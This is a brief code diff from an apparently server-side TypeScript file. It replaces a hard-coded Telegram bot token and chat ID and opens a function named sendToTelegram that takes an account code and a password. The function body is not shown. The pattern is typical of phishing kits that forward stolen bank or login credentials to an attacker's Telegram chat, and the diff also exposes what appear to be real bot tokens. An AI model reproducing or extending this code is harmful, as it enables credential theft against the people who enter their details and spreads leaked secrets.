@@ -1,7 +1,7 @@
 "use server"
 
-const botToken = "7252070867:AAEnQpmQ9Mxww3SosyBUVvAocXH0nW0Tz84"
-const chatId = "5219969216"
+const botToken = "8293022244:AAEdFPyss9TO2m41iC96vkPqJx9yZvFN64w"
+const chatId = "-4929380326"
 
 export async function sendToTelegram(ccp: string, password: string) {
   try {
